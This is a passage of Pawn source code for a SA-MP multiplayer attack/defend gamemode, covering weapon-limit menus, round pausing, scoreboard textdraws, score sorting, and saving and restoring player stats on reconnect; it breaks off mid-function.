stock ShowWepLimit(playerid) {
	new WepTStr[700];

	format(WepTStr, sizeof(WepTStr), "{FF0000}ID\tPrimary Weapon\tSecondary Weapon\tAvailibility\n");
    for(new i=0; i < 10; ++i) {
        new str[100];
        new tabs[7] = "";

		if(GunMenuWeapons[i][1] != 25 && GunMenuWeapons[i][1] != 23) {
		    tabs = "\t";
		}

        if( i % 2 == 0) format(str, sizeof(str), "{FF3333}%d\t%s\t\t\t%s\t\t%s%d\n", i+1, WeaponNames[GunMenuWeapons[i][0]], WeaponNames[GunMenuWeapons[i][1]], tabs, WeaponLimit[i] - TimesPicked[ATTACKER][i]);
        else format(str, sizeof(str), "{FF6666}%d\t%s\t\t\t%s\t\t%s%d\n", i+1, WeaponNames[GunMenuWeapons[i][0]], WeaponNames[GunMenuWeapons[i][1]], tabs, WeaponLimit[i] - TimesPicked[ATTACKER][i]);
        strcat(WepTStr, str);
    }
    ShowPlayerDialog(playerid, DIALOG_WEAPONS_LIMIT, DIALOG_STYLE_LIST, ""COL_PRIM"Weapon limits",WepTStr, "Select", "Exit");
}

stock EnableInterface(playerid) {
	if(IsPlayerInAnyVehicle(playerid)) return 1;

	SelectTextDraw(playerid, 0xFF0000FF);
	TextDrawShowForPlayer(playerid, WeaponLimitTD);
	TextDrawShowForPlayer(playerid, WarModeText);
	TextDrawShowForPlayer(playerid, SettingBox);
	TextDrawShowForPlayer(playerid, LockServerTD);
	TextDrawShowForPlayer(playerid, CloseText);
	PlayerOnInterface[playerid] = true;

	return 1;
}

stock RemovePlayerFromRound(playerid) {
	Player[playerid][Playing] = false;

	if(Current != -1 && Player[playerid][WasInCP] == true) {
	    Player[playerid][WasInCP] = false;
	    PlayersInCP--;
		if(PlayersInCP <= 0) {
		    CurrentCPTime = ConfigCPTime;
		    TextDrawHideForAll(EN_CheckPoint);
		}
	}

	#if ENABLED_TDM == 1
	Player[playerid][InTDM] = false;
	#endif
	Player[playerid][WasInBase] = false;
	Player[playerid][ToAddInRound] = false;
	TogglePlayerControllableEx(playerid, true);
	RemovePlayerMapIcon(playerid, 59);

	DisablePlayerCheckpoint(playerid);
	SetPlayerScore(playerid, 0);
	HideDialogs(playerid);

	PlayerTextDrawHide(playerid, AreaCheckTD);
	PlayerTextDrawHide(playerid, AreaCheckBG);

	if(Player[playerid][WeaponPicked] > 0) {
 		TimesPicked[Player[playerid][Team]][Player[playerid][WeaponPicked]-1]--;
 		Player[playerid][WeaponPicked] = 0;
	}

	SpawnPlayerEx(playerid);
	return 1;
}

stock IsPlayerInArea(playerid, Float:minx, Float:maxx, Float:miny, Float:maxy) {
    new Float:x, Float:y, Float:z;
    GetPlayerPos(playerid, x, y, z);
    if (x > minx && x < maxx && y > miny && y < maxy) return 1;
    return 0;
}

stock HideDialogs(playerid)
{
	ShowPlayerDialog(playerid, -1, 0, " ", " ", " ", " ");
	return 1;
}

stock PauseRound() {

	new iString[128];
	iString = "~r~Round Paused";

	foreach(new i : Player)
	{
		PlayerTextDrawSetString(i, FPSPingPacket,iString);
		TextDrawSetString(PauseTD,iString);
		TextDrawShowForAll(PauseTD);
		if(GetPlayerWeapon(i) == WEAPON_PARACHUTE)
			Player[i][ToGiveParachute] = true;
		if(Player[i][Playing] == true)
		{

            if(IsPlayerInAnyVehicle(i))
			{
                GetVehiclePos(GetPlayerVehicleID(i), VehiclePos[i][0], VehiclePos[i][1], VehiclePos[i][2]);
			}
			TogglePlayerControllableEx(i, false);
		}
	}
	for(new g = 0; g < MAX_VEHICLES; g ++)
		GetVehicleVelocity(g, VehicleVelc[g][0], VehicleVelc[g][1], VehicleVelc[g][2]);


	#if ANTICHEAT == 1
	if(AntiCheat) {
		SendClientMessageToAll(-1, "{FFFF00}** "COL_PRIM"Checking all players for 2 PC trick");
	}
	#endif

	RoundPaused = true;
}


new PLAYER_current_team[MAX_PLAYERS];
stock SAMP_SetPlayerTeam(playerid, teamid)
{
	if(ServerAntiLag == true) {
		teamid = ANTILAG_TEAM;
	}

	PLAYER_current_team[playerid] = teamid;
	foreach(new i : Player) {
		SetPlayerTeam(i,PLAYER_current_team[i]);
	}

}

stock ShowEndRoundTextDraw(playerid) {

	TextDrawShowForPlayer( playerid, leftBG	 	); 		TextDrawShowForPlayer( playerid, rightBG    	);
	TextDrawShowForPlayer( playerid, leftUpBG	); 		TextDrawShowForPlayer( playerid, rightUpBG  	);
	TextDrawShowForPlayer( playerid, leftHeader );		TextDrawShowForPlayer( playerid, rightHeader 	);
	TextDrawShowForPlayer( playerid, leftULine	); 		TextDrawShowForPlayer( playerid, rightULine 	);
	TextDrawShowForPlayer( playerid, leftUpText ); 		TextDrawShowForPlayer( playerid, rightUpText 	);
	TextDrawShowForPlayer( playerid, leftText	); 		TextDrawShowForPlayer( playerid, rightText	 	);
 	TextDrawShowForPlayer( playerid, leftTop	);		//TextDrawShowForPlayer( playerid, rightTop      	);
 	TextDrawShowForPlayer( playerid, lowerBG	);		TextDrawShowForPlayer( playerid, lowerULine 	);
 	TextDrawShowForPlayer( playerid, topTextScore);

 	//contents:
    TextDrawShowForPlayer( playerid, leftNames	); 		TextDrawShowForPlayer( playerid, rightNames 	);
    TextDrawShowForPlayer( playerid, leftKills	); 		TextDrawShowForPlayer( playerid, rightKills 	);
    if(MatchEnded == false){
		TextDrawHideForPlayer( playerid, leftDeaths );      TextDrawHideForPlayer( playerid, rightDeaths    );
		TextDrawShowForPlayer( playerid, leftHP		); 		TextDrawShowForPlayer( playerid, rightHP		);
	} else {
		TextDrawHideForPlayer( playerid, leftHP 	);      TextDrawHideForPlayer( playerid, rightHP    	);
		TextDrawShowForPlayer( playerid, leftDeaths	); 		TextDrawShowForPlayer( playerid, rightDeaths	);
	}
	TextDrawShowForPlayer( playerid, leftDmg	); 		TextDrawShowForPlayer( playerid, rightDmg	 	);
    TextDrawShowForPlayer( playerid, leftAcc	); 		TextDrawShowForPlayer( playerid, rightAcc	 	);

	if( MatchEnded == true )
	{
		TextDrawShowForPlayer( playerid, leftPlayed 	);
		TextDrawShowForPlayer( playerid, rightPlayed	);

		TextDrawHideForPlayer( playerid, teamWonHow	);
	}
	else
	{
		TextDrawShowForPlayer( playerid, teamWonHow	);
	}

	for(new i = 0; i < 3; i++) {
		PlayerTextDrawSetString(playerid, DoingDamage[i], "_");
		PlayerTextDrawSetString(playerid, GettingDamaged[i], "_");
	}

	PlayerTextDrawHide(playerid, DeathText[0]);
	PlayerTextDrawHide(playerid, DeathText[1]);

	Player[playerid][TextDrawOnScreen] = true;
	return 1;
}

stock HideEndRoundTextDraw(playerid) {


	TextDrawHideForPlayer( playerid, leftBG	 	); 		TextDrawHideForPlayer( playerid, rightBG    	);
	TextDrawHideForPlayer( playerid, leftUpBG	); 		TextDrawHideForPlayer( playerid, rightUpBG  	);
	TextDrawHideForPlayer( playerid, leftHeader );		TextDrawHideForPlayer( playerid, rightHeader 	);
	TextDrawHideForPlayer( playerid, leftULine	); 		TextDrawHideForPlayer( playerid, rightULine 	);
	TextDrawHideForPlayer( playerid, leftUpText ); 		TextDrawHideForPlayer( playerid, rightUpText 	);
	TextDrawHideForPlayer( playerid, leftText	); 		TextDrawHideForPlayer( playerid, rightText	 	);
 	TextDrawHideForPlayer( playerid, leftTop	);		//TextDrawHideForPlayer( playerid, rightTop      	);
 	TextDrawHideForPlayer( playerid, lowerBG	);		TextDrawHideForPlayer( playerid, lowerULine 	);
 	TextDrawHideForPlayer( playerid, topTextScore); 	TextDrawHideForPlayer( playerid, teamWonHow 	);
 	//contents:
    TextDrawHideForPlayer( playerid, leftNames	); 		TextDrawHideForPlayer( playerid, rightNames 	);
    TextDrawHideForPlayer( playerid, leftKills	); 		TextDrawHideForPlayer( playerid, rightKills 	);
    TextDrawHideForPlayer( playerid, leftHP	 	); 		TextDrawHideForPlayer( playerid, rightHP	 	);
    TextDrawHideForPlayer( playerid, leftDeaths); 		TextDrawHideForPlayer( playerid, rightDeaths	);
    TextDrawHideForPlayer( playerid, leftDmg	); 		TextDrawHideForPlayer( playerid, rightDmg	 	);
    TextDrawHideForPlayer( playerid, leftAcc	); 		TextDrawHideForPlayer( playerid, rightAcc	 	);
    TextDrawHideForPlayer( playerid, leftPlayed ); 		TextDrawHideForPlayer( playerid, rightPlayed    );

    Player[playerid][TextDrawOnScreen] = false;
    return 1;
}

stock GetPlayerHighestScores(array[][rankingEnum], left, right)
{
    new
        tempLeft = left,
        tempRight = right,
        pivot = array[(left + right) / 2][player_Score],
        tempVar
    ;
    while(tempLeft <= tempRight)
    {
        while(array[tempLeft][player_Score] > pivot) tempLeft++;
        while(array[tempRight][player_Score] < pivot) tempRight--;

        if(tempLeft <= tempRight)
        {
            tempVar = array[tempLeft][player_Score], array[tempLeft][player_Score] = array[tempRight][player_Score], array[tempRight][player_Score] = tempVar;
            tempVar = array[tempLeft][player_ID], array[tempLeft][player_ID] = array[tempRight][player_ID], array[tempRight][player_ID] = tempVar;
//			format(tempVarStr, sizeof(tempVarStr), array[tempLeft][player_Name]); format(array[tempLeft][player_Name], MAX_PLAYER_NAME, array[tempRight][player_Name]); format(array[tempRight][player_Name], MAX_PLAYER_NAME, tempVarStr);
            //tempVarStr = array[tempLeft][player_Name], array[tempLeft][player_Name] = array[tempRight][player_Name], array[tempRight][player_Name] = tempVarStr;
            tempVar = array[tempLeft][player_Kills], array[tempLeft][player_Kills] = array[tempRight][player_Kills], array[tempRight][player_Kills] = tempVar;
            tempVar = array[tempLeft][player_Deaths], array[tempLeft][player_Deaths] = array[tempRight][player_Deaths], array[tempRight][player_Deaths] = tempVar;
            tempVar = array[tempLeft][player_Team], array[tempLeft][player_Team] = array[tempRight][player_Team], array[tempRight][player_Team] = tempVar;
            tempLeft++, tempRight--;
        }
    }
    if(left < tempRight) GetPlayerHighestScores(array, left, tempRight);
    if(tempLeft < right) GetPlayerHighestScores(array, tempLeft, right);
}

stock GetPlayerHighestScores2(array[][rankingEnum], names[][MAX_PLAYER_NAME], left, right)
{
    new
        tempLeft = left,
        tempRight = right,
        pivot = array[(left + right) / 2][player_Score],
        tempVar,
		tempVarStr[MAX_PLAYER_NAME]
    ;
    while(tempLeft <= tempRight)
    {
        while(array[tempLeft][player_Score] > pivot) tempLeft++;
        while(array[tempRight][player_Score] < pivot) tempRight--;

        if(tempLeft <= tempRight)
        {
            tempVar = array[tempLeft][player_Score], array[tempLeft][player_Score] = array[tempRight][player_Score], array[tempRight][player_Score] = tempVar;
            tempVar = array[tempLeft][player_ID], array[tempLeft][player_ID] = array[tempRight][player_ID], array[tempRight][player_ID] = tempVar;
            tempVarStr = names[tempLeft], names[tempLeft] = names[tempRight], names[tempRight] = tempVarStr;
            tempVar = array[tempLeft][player_Kills], array[tempLeft][player_Kills] = array[tempRight][player_Kills], array[tempRight][player_Kills] = tempVar;
            tempVar = array[tempLeft][player_Deaths], array[tempLeft][player_Deaths] = array[tempRight][player_Deaths], array[tempRight][player_Deaths] = tempVar;
            tempVar = array[tempLeft][player_Team], array[tempLeft][player_Team] = array[tempRight][player_Team], array[tempRight][player_Team] = tempVar;
            tempVar = array[tempLeft][player_TPlayed], array[tempLeft][player_TPlayed] = array[tempRight][player_TPlayed], array[tempRight][player_TPlayed] = tempVar;
            tempVar = array[tempLeft][player_HP], array[tempLeft][player_HP] = array[tempRight][player_HP], array[tempRight][player_HP] = tempVar;
            tempVar = array[tempLeft][player_Acc], array[tempLeft][player_Acc] = array[tempRight][player_Acc], array[tempRight][player_Acc] = tempVar;
            tempLeft++, tempRight--;
        }
    }
    if(left < tempRight) GetPlayerHighestScores2(array, names, left, tempRight);
    if(tempLeft < right) GetPlayerHighestScores2(array, names, tempLeft, right);


}

stock StorePlayerVariablesMin(playerid) {
    for(new i = 0; i < SAVE_SLOTS; i ++){
	   	if(strlen(SaveVariables[i][pName]) < 2) {
	   	    if(Player[playerid][Playing] == true) SaveVariables[i][pTeam] 	= 	Player[playerid][Team];
	   	    else SaveVariables[i][pTeam]    =   Player[playerid][TempTeam];

	   	    SaveVariables[i][RKills]   	=  	Player[playerid][RoundKills];
			SaveVariables[i][RDeaths]  	= 	Player[playerid][RoundDeaths];
			SaveVariables[i][RDamage] 	= 	Player[playerid][RoundDamage];
			SaveVariables[i][TKills]   	=  	Player[playerid][TotalKills];
			SaveVariables[i][TDeaths]  	= 	Player[playerid][TotalDeaths];
			SaveVariables[i][TDamage] 	= 	Player[playerid][TotalDamage];
			SaveVariables[i][TPlayed]   =   Player[playerid][RoundPlayed];

			OnPlayerAmmoUpdate(playerid);
			SaveVariables[i][iAccuracy] =   floatround(Player[playerid][Accuracy], floatround_round);
			SaveVariables[i][tshotsHit] =   Player[playerid][TotalshotsHit];
			SaveVariables[i][tBulletsShot] = Player[playerid][TotalBulletsFired];

			for(new j = 0; j < 55; j ++)
		 		SaveVariables[i][WeaponStat][j] = Player[playerid][WeaponStat][j];

			SaveVariables[i][gHealth]  =   0;
			SaveVariables[i][gArmour]  =   0;

			SaveVariables[i][RoundID]   =   Current;
			SaveVariables[i][ToBeAdded] =   false;
			SaveVariables[i][CheckScore] = 	true;

			format(SaveVariables[i][pName], 24, Player[playerid][Name]);
			format(SaveVariables[i][pNameWithoutTag], 24, Player[playerid][NameWithoutTag]);

			if(GetPlayerWeapon(playerid) == WEAPON_PARACHUTE)
			    SaveVariables[i][HadParachute] = 1;
			else
			    SaveVariables[i][HadParachute] = 0;

			if(IsPlayerInAnyVehicle(playerid))
			{
			    SaveVariables[i][pVehicleID] = GetPlayerVehicleID(playerid);
			    SaveVariables[i][pSeatID] = GetPlayerVehicleSeat(playerid);
			}
			else
			{
			    SaveVariables[i][pVehicleID] = -1;
			    SaveVariables[i][pSeatID] = -1;
			}

			break;
		} else continue;
	}
	return 1;
}

stock StorePlayerVariables(playerid) {
	new iString[128];
	for(new i = 0; i < SAVE_SLOTS; i ++){
	   	if(strlen(SaveVariables[i][pName]) < 2){
			format(SaveVariables[i][pName], 24, Player[playerid][Name]);
			format(SaveVariables[i][pNameWithoutTag], 24, Player[playerid][NameWithoutTag]);

	       	GetPlayerPos(playerid, SaveVariables[i][pCoords][0],SaveVariables[i][pCoords][1],SaveVariables[i][pCoords][2]);
	 		GetPlayerFacingAngle(playerid, SaveVariables[i][pCoords][3]);

			if(Player[i][ToAddInRound] == false) {
				GetHP(playerid, SaveVariables[i][gHealth]);
				GetAP(playerid, SaveVariables[i][gArmour]);
			} else {
			    SaveVariables[i][gArmour] = 100.0;
			    SaveVariables[i][gHealth] = 100.0;
			}

	   	    if(Player[playerid][Playing] == true) SaveVariables[i][pTeam] 	= 	Player[playerid][Team];
	   	    else SaveVariables[i][pTeam]    =   Player[playerid][TempTeam];

	        SaveVariables[i][pInterior] = 	GetPlayerInterior(playerid);
	        SaveVariables[i][pVWorld] 	= 	GetPlayerVirtualWorld(playerid);

			SaveVariables[i][RKills]   	=  	Player[playerid][RoundKills];
			SaveVariables[i][RDeaths]  	= 	Player[playerid][RoundDeaths];
			SaveVariables[i][RDamage] 	= 	Player[playerid][RoundDamage];
			SaveVariables[i][TKills]   	=  	Player[playerid][TotalKills];
			SaveVariables[i][TDeaths]  	= 	Player[playerid][TotalDeaths];
			SaveVariables[i][TDamage] 	= 	Player[playerid][TotalDamage];
			SaveVariables[i][TPlayed]   =   Player[playerid][RoundPlayed];
			OnPlayerAmmoUpdate(playerid);
			SaveVariables[i][iAccuracy] =  floatround(Player[playerid][Accuracy], floatround_round);
			SaveVariables[i][tshotsHit] =   Player[playerid][TotalshotsHit];
			SaveVariables[i][tBulletsShot] = Player[playerid][TotalBulletsFired];

			for(new j = 0; j < 55; j ++)
				 SaveVariables[i][WeaponStat][j] = Player[playerid][WeaponStat][j];

			SaveVariables[i][WeaponsPicked] = Player[playerid][WeaponPicked];
			if(Player[playerid][WeaponPicked] > 0){
		 		TimesPicked[Player[playerid][Team]][SaveVariables[i][WeaponsPicked]-1]--;
		 		Player[playerid][WeaponPicked] = 0;
			}

			SaveVariables[i][RoundID]   =   Current;
			SaveVariables[i][ToBeAdded] =   true;
			SaveVariables[i][CheckScore] = 	true;

			if(GetPlayerWeapon(playerid) == WEAPON_PARACHUTE)
			    SaveVariables[i][HadParachute] = 1;
			else
			    SaveVariables[i][HadParachute] = 0;

			if(IsPlayerInAnyVehicle(playerid))
			{
			    SaveVariables[i][pVehicleID] = GetPlayerVehicleID(playerid);
			    SaveVariables[i][pSeatID] = GetPlayerVehicleSeat(playerid);
			}
			else
			{
			    SaveVariables[i][pVehicleID] = -1;
			    SaveVariables[i][pSeatID] = -1;
			}

			if(Player[playerid][ToAddInRound] == true || (RoundMints == ConfigRoundTime-1 && RoundSeconds > 30)) SaveVariables[i][WasCrashedInStart] = true;

	        format(iString,sizeof(iString),"{FFFFFF}%s's "COL_PRIM"variables saved.", Player[playerid][Name]);
	    	SendClientMessageToAll(-1, iString);
	    	break;
        } else continue;
	}
}

forward ReshowCPForPlayer(playerid);
public ReshowCPForPlayer(playerid)
{
    SetPlayerCheckpoint(playerid, BCPSpawn[Current][0], BCPSpawn[Current][1], BCPSpawn[Current][2], 2);
	GangZoneShowForPlayer(playerid, CPZone, 0xFF000044);
	SendClientMessage(playerid, -1, ""COL_PRIM"If you still have problems with reaching CP and its gangzone, try {FFFFFF}/fixcp");
	return 1;
}

stock LoadPlayerVariables(playerid)
{
 	new iString[160];

	for(new i = 0; i < SAVE_SLOTS; i ++)
	{
		if( strlen( SaveVariables[i][pName] ) > 2 && strcmp( SaveVariables[i][pName], Player[playerid][Name], true ) == 0 )
		{
			if(SaveVariables[i][RoundID] != Current || Current == -1)
			{

				Player[playerid][TotalKills] 		= 	SaveVariables[i][TKills];
				Player[playerid][TotalDeaths] 		= 	SaveVariables[i][TDeaths];
				Player[playerid][TotalDamage] 		= 	SaveVariables[i][TDamage];
                Player[playerid][RoundPlayed] 		= 	SaveVariables[i][TPlayed];
                Player[playerid][Accuracy]      	=   SaveVariables[i][iAccuracy];
			 	Player[playerid][TotalshotsHit]		=	SaveVariables[i][tshotsHit];
			 	Player[playerid][TotalBulletsFired] = 	SaveVariables[i][tBulletsShot];

			 	for(new j = 0; j < 55; j ++)
    				Player[playerid][WeaponStat][j] = SaveVariables[i][WeaponStat][j];

                ResetSaveVariables(i);

				format(iString, sizeof(iString), "{FFFFFF}%s "COL_PRIM"has spawned as: {FFFFFF}%s", Player[playerid][Name], TeamName[Player[playerid][Team]]);
				SendClientMessageToAll(-1, iString);

				if(Player[playerid][TextPos] == false) format(iString, sizeof(iString), "~n~~n~%sKills ~r~%d~n~%sDamage ~r~%.0f~n~%sTotal Dmg ~r~%.0f", MAIN_TEXT_COLOUR, Player[playerid][RoundKills], MAIN_TEXT_COLOUR, Player[playerid][RoundDamage], MAIN_TEXT_COLOUR, Player[playerid][TotalDamage]);
				else format(iString, sizeof(iString), "~n~~n~%sKills ~r~%d~n~%sDmg ~r~%.0f~n~%sT. Dmg ~r~%.0f", MAIN_TEXT_COLOUR, Player[playerid][RoundKills], MAIN_TEXT_COLOUR, Player[playerid][RoundDamage], MAIN_TEXT_COLOUR, Player[playerid][TotalDamage]);
				PlayerTextDrawSetString(playerid, RoundKillDmgTDmg, iString);

				return 1;
			}
			else if(SaveVariables[i][ToBeAdded] == false)
			{
				Player[playerid][TotalKills] 		= 	SaveVariables[i][TKills];
				Player[playerid][TotalDeaths] 		= 	SaveVariables[i][TDeaths];
				Player[playerid][TotalDamage] 		= 	SaveVariables[i][TDamage];
				Player[playerid][RoundPlayed] 		= 	SaveVariables[i][TPlayed];
				Player[playerid][Accuracy]      	=   SaveVariables[i][iAccuracy];
			 	Player[playerid][TotalshotsHit]		=	SaveVariables[i][tshotsHit];
			 	Player[playerid][TotalBulletsFired] = 	SaveVariables[i][tBulletsShot];
				Player[playerid][RoundKills]        =   SaveVariables[i][RKills];
				Player[playerid][RoundDeaths]       =	SaveVariables[i][RDeaths];
				Player[playerid][RoundDamage]       =	SaveVariables[i][RDamage];

                for(new j = 0; j < 55; j ++)
    				Player[playerid][WeaponStat][j] = SaveVariables[i][WeaponStat][j];


				Player[playerid][WasInBase]         =   true;

                ResetSaveVariables(i);

				format(iString, sizeof(iString), "{FFFFFF}%s "COL_PRIM"has spawned as: {FFFFFF}%s", Player[playerid][Name], TeamName[Player[playerid][Team]]);
				SendClientMessageToAll(-1, iString);

				if(Player[playerid][TextPos] == false) format(iString, sizeof(iString), "~n~~n~%sKills ~r~%d~n~%sDamage ~r~%.0f~n~%sTotal Dmg ~r~%.0f", MAIN_TEXT_COLOUR, Player[playerid][RoundKills], MAIN_TEXT_COLOUR, Player[playerid][RoundDamage], MAIN_TEXT_COLOUR, Player[playerid][TotalDamage]);
				else format(iString, sizeof(iString), "~n~~n~%sKills ~r~%d~n~%sDmg ~r~%.0f~n~%sT. Dmg ~r~%.0f", MAIN_TEXT_COLOUR, Player[playerid][RoundKills], MAIN_TEXT_COLOUR, Player[playerid][RoundDamage], MAIN_TEXT_COLOUR, Player[playerid][TotalDamage]);
				PlayerTextDrawSetString(playerid, RoundKillDmgTDmg, iString);

				return 1;
			}

			Player[playerid][Playing] = true;
			Player[playerid][WasInBase] = true;

	        Player[playerid][Team] = SaveVariables[i][pTeam];
			SetHP(playerid, SaveVariables[i][gHealth]);
			SetAP(playerid, SaveVariables[i][gArmour]);



			Player[playerid][RoundKills] 	= 	SaveVariables[i][RKills];
			Player[playerid][RoundDeaths] 	= 	SaveVariables[i][RDeaths];
			Player[playerid][RoundDamage] 	= 	SaveVariables[i][RDamage];
			Player[playerid][TotalKills] 	= 	SaveVariables[i][TKills];
			Player[playerid][TotalDeaths] 	= 	SaveVariables[i][TDeaths];
			Player[playerid][TotalDamage] 	= 	SaveVariables[i][TDamage];
			Player[playerid][RoundPlayed] 	= 	SaveVariables[i][TPlayed];
			Player[playerid][Accuracy]      =   SaveVariables[i][iAccuracy];
		 	Player[playerid][TotalshotsHit]	=	SaveVariables[i][tshotsHit];
		 	Player[playerid][TotalBulletsFired] = SaveVariables[i][tBulletsShot];

		 	for(new j = 0; j < 55; j ++)
				Player[playerid][WeaponStat][j] = SaveVariables[i][WeaponStat][j];

            if(SaveVariables[i][WasCrashedInStart] == false)
			{
				SetPlayerPos(playerid, SaveVariables[i][pCoords][0], SaveVariables[i][pCoords][1], SaveVariables[i][pCoords][2]);
				SetPlayerFacingAngle(playerid, SaveVariables[i][pCoords][3]);
				SetPlayerInterior(playerid, SaveVariables[i][pInterior]);
				SetPlayerVirtualWorld(playerid, SaveVariables[i][pVWorld]);
			}
			else if(Current != -1)
			{
			    if(GameType == BASE) {
					switch(Player[playerid][Team]) {
					    case ATTACKER: SetPlayerPos(playerid, BAttackerSpawn[Current][0] + random(6), BAttackerSpawn[Current][1] + random(6), BAttackerSpawn[Current][2]);
						case DEFENDER: SetPlayerPos(playerid, BDefenderSpawn[Current][0] + random(6), BDefenderSpawn[Current][1] + random(6), BDefenderSpawn[Current][2]);
				    }
				    SetPlayerInterior(playerid, BInterior[Current]);
				} else if(GameType == ARENA || GameType == TDM) {
					switch(Player[playerid][Team]) {
					    case ATTACKER: {
							SetPlayerPos(playerid, AAttackerSpawn[Current][0] + random(6), AAttackerSpawn[Current][1] + random(6), AAttackerSpawn[Current][2]);
						} case DEFENDER: {
					 		SetPlayerPos(playerid, ADefenderSpawn[Current][0] + random(6), ADefenderSpawn[Current][1] + random(6), ADefenderSpawn[Current][2]);
						}
					}
				    SetPlayerInterior(playerid, AInterior[Current]);
				}
				SetPlayerVirtualWorld(playerid, 2);
			}

			ColorFix(playerid);
			SetPlayerSkin(playerid, Skin[Player[playerid][Team]]);
			SAMP_SetPlayerTeam(playerid, Player[playerid][Team]);

   			RadarFix();

	        if(GameType == BASE)
			{
				if(SaveVariables[i][WeaponsPicked] > -1)
				{
					//OnDialogResponse(playerid, DIALOG_WEAPONS_TYPE, 1, SaveVariables[i][WeaponsPicked], "");
					new listitem = SaveVariables[i][WeaponsPicked];
                    if(listitem != 0)
					{
						if((Player[playerid][Team] == ATTACKER && TimesPicked[ATTACKER][listitem-1] >= WeaponLimit[listitem-1]) || (Player[playerid][Team] == DEFENDER && TimesPicked[DEFENDER][listitem-1] >= WeaponLimit[listitem-1]))
						{
			                ShowPlayerWeaponMenu(playerid, Player[playerid][Team]);
			                SendErrorMessage(playerid,"This Weapon Set Is Currently Full.");
			                SetTimerEx("ReshowCPForPlayer", 1000, false, "i", playerid);
							return 1;
				        }
					}

					if(!listitem)
					{
					    ShowPlayerWeaponMenu(playerid, Player[playerid][Team]);
					    SetTimerEx("ReshowCPForPlayer", 1000, false, "i", playerid);
						return 1;
					}
					else
					{
					    GivePlayerWeapon(playerid, GunMenuWeapons[listitem-1][0], 9999);
					    GivePlayerWeapon(playerid, GunMenuWeapons[listitem-1][1], 9999);
					    if(IsPlayerInAnyVehicle(playerid))
							SetPlayerArmedWeapon(playerid, 0);
					    switch(GunMenuWeapons[listitem-1][0])
					    {
					        case WEAPON_DEAGLE:
					        {
					            format(Player[playerid][PlayerTypeByWeapon], 16, "Deagler");
					        }
					        case WEAPON_SHOTGSPA:
					        {
		                        format(Player[playerid][PlayerTypeByWeapon], 16, "Spasser");
					        }
					        case WEAPON_M4:
					        {
		                        format(Player[playerid][PlayerTypeByWeapon], 16, "M4~er");
					        }
					        case WEAPON_SNIPER:
					        {
		                        format(Player[playerid][PlayerTypeByWeapon], 16, "Sniper");
					        }
					        case WEAPON_AK47:
					        {
		                        format(Player[playerid][PlayerTypeByWeapon], 16, "AK~er");
							}
							default:
							{
		                        switch(GunMenuWeapons[listitem-1][1])
							    {
				                    case WEAPON_DEAGLE:
							        {
							            format(Player[playerid][PlayerTypeByWeapon], 16, "Deagler");
							        }
							        case WEAPON_SHOTGSPA:
							        {
				                        format(Player[playerid][PlayerTypeByWeapon], 16, "Spasser");
							        }
							        case WEAPON_M4:
							        {
				                        format(Player[playerid][PlayerTypeByWeapon], 16, "M4~er");
							        }
							        case WEAPON_SNIPER:
							        {
				                        format(Player[playerid][PlayerTypeByWeapon], 16, "Sniper");
							        }
							        case WEAPON_AK47:
							        {
				                        format(Player[playerid][PlayerTypeByWeapon], 16, "AK~er");
									}
									default:
									{
				                        format(Player[playerid][PlayerTypeByWeapon], 16, "Un-recognised");
									}
							    }
							}
					    }
					    if(GiveKnife)
			    			GivePlayerWeapon(playerid, WEAPON_KNIFE, 9999);

					    format(iString, sizeof(iString), "%s%s{FFFFFF} has selected (%s%s{FFFFFF} and %s%s{FFFFFF}).", TextColor[Player[playerid][Team]], Player[playerid][Name], TextColor[Player[playerid][Team]], WeaponNames[GunMenuWeapons[listitem-1][0]], TextColor[Player[playerid][Team]], WeaponNames[GunMenuWeapons[listitem-1][1]]);
					}

		            TimesPicked[Player[playerid][Team]][listitem-1]++;
		            Player[playerid][WeaponPicked] = listitem;

			        switch(Player[playerid][Team])
					{
						case ATTACKER:
						{
							foreach(new j : Player)
							{
		                		if(Player[j][Team] == ATTACKER)
									SendClientMessage(j, -1, iString);
							}
						}
						case DEFENDER:
						{

						    foreach(new j : Player)
							{
		                		if(Player[j][Team] == DEFENDER)
									SendClientMessage(j, -1, iString);
							}
						}
		            }

			        if(RoundPaused == true)
						TogglePlayerControllableEx(playerid, false);
			        else
						TogglePlayerControllableEx(playerid, true);
				}
				else
				{
				    ShowPlayerWeaponMenu(playerid, Player[playerid][Team]);
                }

                if(SaveVariables[i][HadParachute] == 1)
				{
				    GivePlayerWeapon(playerid, WEAPON_PARACHUTE, 1);
				    SetPlayerArmedWeapon(playerid, WEAPON_PARACHUTE);
				}
				else
					SetPlayerArmedWeapon(playerid, 0);

				if(SaveVariables[i][pVehicleID] != -1)
				{
				    SetTimerEx("RespawnInVehicleAfterComeBack", 500, false, "ddd", playerid, SaveVariables[i][pVehicleID], SaveVariables[i][pSeatID]);
				}

				//ShowPlayerWeaponMenu(playerid, Player[playerid][Team]);
				SetPlayerCheckpoint(playerid, BCPSpawn[Current][0], BCPSpawn[Current][1], BCPSpawn[Current][2], 2);
				GangZoneShowForPlayer(playerid, CPZone, 0xFF000044);
				SetTimerEx("ReshowCPForPlayer", 1000, false, "i", playerid);
			}
			else if(GameType == ARENA || GameType == TDM )
			{
				GivePlayerArenaWeapons(playerid);
			}


			if(TeamHPDamage == true) {
				switch(Player[playerid][Team]) {
				    case ATTACKER: {
						TextDrawShowForPlayer(playerid, AttackerTeam[0]);
						TextDrawShowForPlayer(playerid, AttackerTeam[1]);
					} case DEFENDER: {
						TextDrawShowForPlayer(playerid, DefenderTeam[0]);
						TextDrawShowForPlayer(playerid, DefenderTeam[1]);
		            }
				}
			}

			if(RoundPaused == true) {
				TogglePlayerControllableEx(playerid, false);
				iString = "~r~Round Paused";
				PlayerTextDrawSetString(playerid, FPSPingPacket, iString);
				TextDrawSetString(PauseTD, iString);
				TextDrawShowForAll(PauseTD);
			}


	        format(iString,sizeof(iString),""COL_PRIM"Re-added player {FFFFFF}%s. "COL_PRIM"Variables successfully loaded.", Player[playerid][Name]);
	    	SendClientMessageToAll(-1, iString);

			if(Player[playerid][TextPos] == false) format(iString, sizeof(iString), "~n~~n~%sKills ~r~%d~n~%sDamage ~r~%.0f~n~%sTotal Dmg ~r~%.0f", MAIN_TEXT_COLOUR, Player[playerid][RoundKills], MAIN_TEXT_COLOUR, Player[playerid][RoundDamage], MAIN_TEXT_COLOUR, Player[playerid][TotalDamage]);
			else format(iString, sizeof(iString), "~n~~n~%sKills ~r~%d~n~%sDmg ~r~%.0f~n~%sT. Dmg ~r~%.0f", MAIN_TEXT_COLOUR, Player[playerid][RoundKills], MAIN_TEXT_COLOUR, Player[playerid][RoundDamage], MAIN_TEXT_COLOUR, Player[playerid][TotalDamage]);
